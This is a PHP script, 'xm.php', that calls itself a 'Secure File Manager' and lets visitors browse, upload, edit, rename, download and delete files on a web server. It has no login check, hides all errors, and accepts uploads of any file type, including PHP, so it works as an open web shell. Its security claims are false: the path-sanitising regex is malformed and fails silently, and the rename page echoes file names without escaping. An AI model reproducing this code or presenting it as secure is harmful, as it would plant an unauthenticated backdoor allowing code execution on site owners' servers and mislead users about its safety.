<?php
// Simple Secure File Manager - xm.php (Fixed Navigation & Path Display)
// ✅ Full path display with Back navigation
// ✅ Prevents overwrite, 0-byte upload, directory traversal

session_start();
error_reporting(0);

// ==== Configuration ====
$base_dir = realpath(__DIR__); // safer absolute base directory
$allowed_actions = ['list', 'view', 'edit', 'rename', 'delete', 'upload', 'download', 'create_folder'];

// ==== Security Functions ====
function sanitize_path($path) {
    $path = str_replace('..', '', $path);
    $path = preg_replace('/[^a-zA-Z0-9._-/]/', '', $path);
    return trim($path, '/');
}

function get_file_list($dir) {
    $files = [];
    if (is_dir($dir)) {
        $items = scandir($dir);
        foreach ($items as $item) {
            if ($item != '.' && $item != '..') {
                $full_path = $dir . '/' . $item;
                $files[] = [
                    'name' => $item,
                    'path' => $full_path,
                    'size' => is_file($full_path) ? filesize($full_path) : 0,
                    'type' => is_dir($full_path) ? 'directory' : 'file',
                    'modified' => date('Y-m-d H:i:s', filemtime($full_path))
                ];
            }
        }
    }
    return $files;
}

function format_size($bytes) {
    if ($bytes == 0) return '0 B';
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = floor(log($bytes, 1024));
    return round($bytes / pow(1024, $i), 2) . ' ' . $units[$i];
}

// ==== Get current directory ====
$requested_dir = isset($_GET['dir']) ? sanitize_path($_GET['dir']) : '';
$current_dir = $base_dir . ($requested_dir ? '/' . $requested_dir : '');
$current_dir = realpath($current_dir);

// Fallback to base_dir if invalid
if ($current_dir === false || strpos($current_dir, $base_dir) !== 0) {
    $current_dir = $base_dir;
    $requested_dir = '';
}

// ==== Handle Actions ====
$action = $_GET['action'] ?? 'list';

// Process actions that modify files
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    switch ($action) {
        case 'edit':
            $file = sanitize_path($_GET['file'] ?? '');
            $file_path = $current_dir . '/' . $file;
            if (file_exists($file_path) && is_file($file_path)) {
                $content = $_POST['content'] ?? '';
                file_put_contents($file_path, $content);
            }
            header("Location: ?action=list&dir=" . urlencode($requested_dir));
            exit;

        case 'rename':
            $old_name = sanitize_path($_GET['file'] ?? '');
            $new_name = sanitize_path($_POST['new_name'] ?? '');
            if ($old_name && $new_name) {
                $old_path = $current_dir . '/' . $old_name;
                $new_path = $current_dir . '/' . $new_name;
                if (file_exists($old_path) && !file_exists($new_path)) {
                    rename($old_path, $new_path);
                }
            }
            header("Location: ?action=list&dir=" . urlencode($requested_dir));
            exit;

        case 'delete':
            $file = sanitize_path($_GET['file'] ?? '');
            $file_path = $current_dir . '/' . $file;
            if (file_exists($file_path)) {
                if (is_dir($file_path)) {
                    $files = new RecursiveIteratorIterator(
                        new RecursiveDirectoryIterator($file_path, RecursiveDirectoryIterator::SKIP_DOTS),
                        RecursiveIteratorIterator::CHILD_FIRST
                    );
                    foreach ($files as $f) {
                        $f->isDir() ? rmdir($f->getRealPath()) : unlink($f->getRealPath());
                    }
                    rmdir($file_path);
                } else {
                    unlink($file_path);
                }
            }
            header("Location: ?action=list&dir=" . urlencode($requested_dir));
            exit;

        case 'upload':
            if (isset($_FILES['file'])) {
                $uploaded_file = $_FILES['file'];
                if ($uploaded_file['error'] === UPLOAD_ERR_OK) {
                    $file_name = sanitize_path($uploaded_file['name']);
                    $file_path = $current_dir . '/' . $file_name;

                    // Prevent overwrite of self or existing files
                    if ($file_name === basename(__FILE__)) {
                        die("⛔ Uploading over the file manager is not allowed.");
                    }
                    if (file_exists($file_path)) {
                        $file_name = time() . '_' . $file_name;
                        $file_path = $current_dir . '/' . $file_name;
                    }

                    if (move_uploaded_file($uploaded_file['tmp_name'], $file_path)) {
                        chmod($file_path, 0644);
                    }
                }
            }
            header("Location: ?action=list&dir=" . urlencode($requested_dir));
            exit;

        case 'create_folder':
            $folder_name = sanitize_path($_POST['folder_name'] ?? '');
            if ($folder_name) {
                $folder_path = $current_dir . '/' . $folder_name;
                if (!file_exists($folder_path)) {
                    mkdir($folder_path, 0755, true);
                }
            }
            header("Location: ?action=list&dir=" . urlencode($requested_dir));
            exit;
    }
}

// Process GET actions that output content
switch ($action) {
    case 'view':
        $file = sanitize_path($_GET['file'] ?? '');
        $file_path = $current_dir . '/' . $file;
        if (file_exists($file_path) && is_file($file_path)) {
            $mime_type = mime_content_type($file_path);
            header('Content-Type: ' . $mime_type);
            if (strpos($mime_type, 'text/') === 0 || $mime_type === 'application/javascript' || $mime_type === 'application/json') {
                header('Content-Type: text/plain');
            }
            readfile($file_path);
            exit;
        }
        break;

    case 'edit':
        $file = sanitize_path($_GET['file'] ?? '');
        $file_path = $current_dir . '/' . $file;
        if (file_exists($file_path) && is_file($file_path)) {
            $content = htmlspecialchars(file_get_contents($file_path));
            echo "<!DOCTYPE html><html><head><title>Edit: $file</title>";
            echo "<style>
                body { font-family: Arial; padding: 20px; background: #f5f5f5; }
                .container { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); max-width: 1200px; margin: 0 auto; }
                textarea { width: 100%; height: 500px; font-family: 'Courier New', monospace; padding: 15px; border: 1px solid #ddd; border-radius: 5px; font-size: 14px; line-height: 1.5; }
                .btn { padding: 12px 25px; background: #007bff; color: white; text-decoration: none; border-radius: 8px; border: none; cursor: pointer; font-size: 16px; margin: 5px; display: inline-block; }
                .btn:hover { background: #0056b3; }
                .btn-cancel { background: #6c757d; }
                .btn-cancel:hover { background: #545b62; }
                .path-info { background: #e9ecef; padding: 10px; border-radius: 5px; margin-bottom: 15px; font-family: monospace; }
            </style>";
            echo "</head><body>";
            echo "<div class='container'>";
            echo "<h2>✏️ Edit File</h2>";
            echo "<div class='path-info'>📁 Current Path: " . htmlspecialchars($current_dir) . "/" . htmlspecialchars($file) . "</div>";
            echo "<form method='post'>";
            echo "<textarea name='content' spellcheck='false'>$content</textarea><br><br>";
            echo "<button type='submit' class='btn'>💾 Save Changes</button> ";
            echo "<a href='?action=list&dir=" . urlencode($requested_dir) . "' class='btn btn-cancel'>🚫 Cancel</a>";
            echo "</form>";
            echo "</div></body></html>";
            exit;
        }
        break;

    case 'rename':
        $old_name = sanitize_path($_GET['file'] ?? '');
        if ($old_name) {
            echo "<!DOCTYPE html><html><head><title>Rename: $old_name</title>";
            echo "<style>
                body { font-family: Arial; padding: 20px; background: #f5f5f5; }
                .container { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); max-width: 600px; margin: 0 auto; }
                input[type='text'] { padding: 12px; width: 100%; border: 1px solid #ddd; border-radius: 5px; font-size: 16px; margin: 10px 0; }
                .btn { padding: 12px 25px; background: #007bff; color: white; text-decoration: none; border-radius: 8px; border: none; cursor: pointer; font-size: 16px; margin: 5px; }
                .btn:hover { background: #0056b3; }
                .btn-cancel { background: #6c757d; }
                .btn-cancel:hover { background: #545b62; }
                .path-info { background: #e9ecef; padding: 10px; border-radius: 5px; margin-bottom: 15px; font-family: monospace; }
            </style>";
            echo "</head><body>";
            echo "<div class='container'>";
            echo "<h2>🔄 Rename File/Folder</h2>";
            echo "<div class='path-info'>📁 Current Location: " . htmlspecialchars($current_dir) . "</div>";
            echo "<form method='post'>";
            echo "<strong>Current Name:</strong><br>";
            echo "<input type='text' value='$old_name' disabled><br>";
            echo "<strong>New Name:</strong><br>";
            echo "<input type='text' name='new_name' value='$old_name' required><br><br>";
            echo "<button type='submit' class='btn'>🔄 Rename</button> ";
            echo "<a href='?action=list&dir=" . urlencode($requested_dir) . "' class='btn btn-cancel'>🚫 Cancel</a>";
            echo "</form>";
            echo "</div></body></html>";
            exit;
        }
        break;

    case 'download':
        $file = sanitize_path($_GET['file'] ?? '');
        $file_path = $current_dir . '/' . $file;
        if (file_exists($file_path) && is_file($file_path)) {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($file_path) . '"');
            header('Content-Length: ' . filesize($file_path));
            readfile($file_path);
            exit;
        }
        break;
}

// ==== Navigation Setup ====
$dir_parts = [];
$breadcrumb_path = '';

if ($requested_dir) {
    $parts = explode('/', $requested_dir);
    $path_accum = '';
    foreach ($parts as $part) {
        if ($part) {
            $path_accum .= $part . '/';
            $dir_parts[] = [
                'name' => $part,
                'path' => rtrim($path_accum, '/')
            ];
        }
    }
    $breadcrumb_path = $requested_dir;
}

// Get parent directory for back button
$parent_dir = '';
if ($requested_dir) {
    $parts = explode('/', $requested_dir);
    array_pop($parts);
    $parent_dir = implode('/', $parts);
}

// Calculate directory stats
$file_count = 0;
$folder_count = 0;
$total_size = 0;
$files = get_file_list($current_dir);
foreach ($files as $file) {
    if ($file['type'] === 'directory') {
        $folder_count++;
    } else {
        $file_count++;
        $total_size += $file['size'];
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>📁 Secure File Manager</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 20px;
            min-height: 100vh;
        }
        
        .container {
            background: white;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
            max-width: 1400px;
            margin: 0 auto;
        }
        
        h1 {
            color: #333;
            margin-bottom: 20px;
            text-align: center;
            font-size: 2.5em;
            background: linear-gradient(135deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        
        .current-path {
            background: #e9ecef;
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            border-left: 5px solid #007bff;
            font-family: 'Courier New', monospace;
            font-size: 16px;
            word-break: break-all;
        }
        
        .current-path strong {
            color: #495057;
        }
        
        .path-display {
            color: #007bff;
            font-weight: bold;
        }
        
        .breadcrumb {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 25px;
            border: 1px solid #e9ecef;
            display: flex;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
        }
        
        .breadcrumb a {
            color: #007bff;
            text-decoration: none;
            transition: all 0.3s;
            padding: 8px 15px;
            border-radius: 6px;
            background: white;
            border: 1px solid #dee2e6;
        }
        
        .breadcrumb a:hover {
            color: #0056b3;
            background: #007bff;
            color: white;
            text-decoration: none;
        }
        
        .stats-bar {
            background: #17a2b8;
            color: white;
            padding: 12px 20px;
            border-radius: 8px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 15px;
            font-size: 14px;
        }
        
        .stat-item {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .toolbar {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 25px;
            border: 1px solid #e9ecef;
        }
        
        .toolbar form {
            display: flex;
            gap: 10px;
            align-items: center;
            flex-wrap: wrap;
        }
        
        .toolbar input[type="file"],
        .toolbar input[type="text"] {
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 8px;
            flex: 1;
            min-width: 250px;
            font-size: 15px;
        }
        
        .btn {
            padding: 12px 20px;
            background: linear-gradient(135deg, #007bff, #0056b3);
            color: white;
            text-decoration: none;
            border-radius: 8px;
            border: none;
            cursor: pointer;
            transition: all 0.3s ease;
            font-weight: 500;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            font-size: 14px;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 123, 255, 0.3);
        }
        
        .btn-back {
            background: linear-gradient(135deg, #6c757d, #545b62);
        }
        
        .btn-back:hover {
            box-shadow: 0 5px 15px rgba(108, 117, 125, 0.3);
        }
        
        .btn-delete {
            background: linear-gradient(135deg, #dc3545, #c82333);
        }
        
        .btn-delete:hover {
            box-shadow: 0 5px 15px rgba(220, 53, 69, 0.3);
        }
        
        .btn-success {
            background: linear-gradient(135deg, #28a745, #20c997);
        }
        
        .btn-success:hover {
            box-shadow: 0 5px 15px rgba(40, 167, 69, 0.3);
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            background: white;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
        }
        
        th {
            background: linear-gradient(135deg, #007bff, #0056b3);
            color: white;
            padding: 15px;
            text-align: left;
            font-weight: 600;
            font-size: 14px;
        }
        
        td {
            padding: 12px 15px;
            border-bottom: 1px solid #e9ecef;
            font-size: 14px;
        }
        
        tr:hover {
            background: #f8f9fa;
        }
        
        .actions {
            display: flex;
            gap: 5px;
            flex-wrap: wrap;
        }
        
        .actions .btn {
            padding: 6px 10px;
            font-size: 12px;
        }
        
        .file-icon::before {
            content: '📄';
            margin-right: 8px;
        }
        
        .folder-icon::before {
            content: '📁';
            margin-right: 8px;
        }
        
        .empty-state {
            text-align: center;
            padding: 60px 40px;
            color: #6c757d;
            font-size: 1.2em;
            background: #f8f9fa;
            border-radius: 10px;
            border: 2px dashed #dee2e6;
        }
        
        .empty-state::before {
            content: '📭';
            font-size: 4em;
            display: block;
            margin-bottom: 15px;
        }
        
        .file-size {
            font-family: 'Courier New', monospace;
            font-size: 13px;
            color: #495057;
        }
        
        .file-date {
            font-size: 13px;
            color: #6c757d;
        }
        
        @media (max-width: 768px) {
            .container {
                padding: 15px;
            }
            
            .breadcrumb {
                flex-direction: column;
                align-items: flex-start;
            }
            
            .toolbar form {
                flex-direction: column;
                align-items: stretch;
            }
            
            .actions {
                flex-direction: column;
            }
            
            table {
                display: block;
                overflow-x: auto;
            }
            
            .stats-bar {
                flex-direction: column;
                gap: 10px;
            }
        }
    </style>
</head>
<body>
<div class="container">
    <h1>📁 Secure File Manager</h1>

    <!-- Current Path Display -->
    <div class="current-path">
        <strong>📍 Current Directory:</strong><br>
        <span class="path-display"><?= htmlspecialchars($current_dir) ?></span>
    </div>

    <!-- Breadcrumb Navigation -->
    <div class="breadcrumb">
        <a href="?action=list" class="btn">🏠 Root Directory</a>
        
        <?php if ($requested_dir): ?>
            <?php if ($parent_dir): ?>
                <a href="?action=list&dir=<?= urlencode($parent_dir) ?>" class="btn btn-back">⬅️ Back to Parent</a>
            <?php else: ?>
                <a href="?action=list" class="btn btn-back">⬅️ Back to Root</a>
            <?php endif; ?>
        <?php endif; ?>
        
        <?php if (!empty($dir_parts)): ?>
            <span style="color: #6c757d; margin: 0 5px;">Navigation Path:</span>
            <?php foreach ($dir_parts as $index => $part): ?>
                <a href="?action=list&dir=<?= urlencode($part['path']) ?>">
                    <?= htmlspecialchars($part['name']) ?>
                </a>
                <?php if ($index < count($dir_parts) - 1): ?>
                    <span style="color: #6c757d; margin: 0 5px;">/</span>
                <?php endif; ?>
            <?php endforeach; ?>
        <?php endif; ?>
    </div>

    <!-- Statistics Bar -->
    <div class="stats-bar">
        <div class="stat-item">
            <span>📊</span>
            <strong>Files:</strong> <?= $file_count ?>
        </div>
        <div class="stat-item">
            <span>📁</span>
            <strong>Folders:</strong> <?= $folder_count ?>
        </div>
        <div class="stat-item">
            <span>💾</span>
            <strong>Total Size:</strong> <?= format_size($total_size) ?>
        </div>
        <div class="stat-item">
            <span>📝</span>
            <strong>Current Path:</strong> /<?= $requested_dir ? htmlspecialchars($requested_dir) : 'root' ?>
        </div>
    </div>

    <!-- Toolbar -->
    <div class="toolbar">
        <form method="post" enctype="multipart/form-data" action="?action=upload&dir=<?= urlencode($requested_dir) ?>">
            <input type="file" name="file" required>
            <button type="submit" class="btn btn-success">📤 Upload File</button>
        </form>
        
        <form method="post" action="?action=create_folder&dir=<?= urlencode($requested_dir) ?>">
            <input type="text" name="folder_name" placeholder="Enter new folder name" required>
            <button type="submit" class="btn">📁 Create New Folder</button>
        </form>
    </div>

    <!-- File List -->
    <?php
    $files = get_file_list($current_dir);
    if (empty($files)): ?>
        <div class="empty-state">
            <h3>No Files or Folders Found</h3>
            <p>This directory is empty. Upload files or create folders to get started.</p>
        </div>
    <?php else: ?>
        <table>
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Type</th>
                    <th>Size</th>
                    <th>Last Modified</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody>
                <?php foreach ($files as $file): ?>
                    <tr>
                        <td>
                            <span class="<?= $file['type'] === 'directory' ? 'folder-icon' : 'file-icon' ?>">
                                <?= htmlspecialchars($file['name']) ?>
                            </span>
                        </td>
                        <td>
                            <?php if ($file['type'] === 'directory'): ?>
                                <span style="color: #007bff; font-weight: bold;">📁 Folder</span>
                            <?php else: ?>
                                <span style="color: #28a745;">📄 File</span>
                            <?php endif; ?>
                        </td>
                        <td class="file-size">
                            <?= $file['type'] === 'directory' ? '-' : format_size($file['size']) ?>
                        </td>
                        <td class="file-date">
                            <?= $file['modified'] ?>
                        </td>
                        <td class="actions">
                            <?php if ($file['type'] === 'directory'): ?>
                                <a href="?action=list&dir=<?= urlencode(($requested_dir ? $requested_dir . '/' : '') . $file['name']) ?>" class="btn btn-success">📂 Open</a>
                            <?php else: ?>
                                <a href="?action=view&file=<?= urlencode($file['name']) ?>&dir=<?= urlencode($requested_dir) ?>" class="btn" target="_blank">👁️ View</a>
                                <a href="?action=edit&file=<?= urlencode($file['name']) ?>&dir=<?= urlencode($requested_dir) ?>" class="btn">✏️ Edit</a>
                                <a href="?action=download&file=<?= urlencode($file['name']) ?>&dir=<?= urlencode($requested_dir) ?>" class="btn">📥 Download</a>
                                <a href="?action=rename&file=<?= urlencode($file['name']) ?>&dir=<?= urlencode($requested_dir) ?>" class="btn">🔄 Rename</a>
                            <?php endif; ?>
                            <a href="?action=delete&file=<?= urlencode($file['name']) ?>&dir=<?= urlencode($requested_dir) ?>" class="btn btn-delete" onclick="return confirm('Are you sure you want to delete '<?= htmlspecialchars($file['name']) ?>'? This action cannot be undone.')">🗑️ Delete</a>
                        </td>
                    </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    <?php endif; ?>
</div>

<script>
// Enhanced JavaScript for better user experience
document.addEventListener('DOMContentLoaded', function() {
    // Add confirmation for delete actions
    const deleteLinks = document.querySelectorAll('a[href*="action=delete"]');
    deleteLinks.forEach(link => {
        link.addEventListener('click', function(e) {
            const fileName = this.closest('tr').querySelector('td:first-child').textContent.trim();
            if (!confirm(`🚨 Confirm DeletionnnAre you sure you want to delete "${fileName}"?nnThis action cannot be undone!`)) {
                e.preventDefault();
                return false;
            }
        });
    });
    
    // Add loading state for forms
    const forms = document.querySelectorAll('form');
    forms.forEach(form => {
        form.addEventListener('submit', function() {
            const submitBtn = this.querySelector('button[type="submit"]');
            if (submitBtn) {
                const originalText = submitBtn.innerHTML;
                submitBtn.innerHTML = '⏳ Processing...';
                submitBtn.disabled = true;
                
                // Revert after 5 seconds (safety measure)
                setTimeout(() => {
                    submitBtn.innerHTML = originalText;
                    submitBtn.disabled = false;
                }, 5000);
            }
        });
    });
    
    // Add keyboard shortcuts
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape') {
            // Go back on Escape key
            const backBtn = document.querySelector('.btn-back');
            if (backBtn) {
                window.location.href = backBtn.href;
            } else {
                window.location.href = '?action=list';
            }
        }
    });
    
    // Add file type icons and better hover effects
    const fileRows = document.querySelectorAll('tbody tr');
    fileRows.forEach(row => {
        row.addEventListener('mouseenter', function() {
            this.style.transform = 'translateX(5px)';
            this.style.transition = 'transform 0.2s ease';
        });
        
        row.addEventListener('mouseleave', function() {
            this.style.transform = 'translateX(0)';
        });
    });
});
</script>
</body>
</html>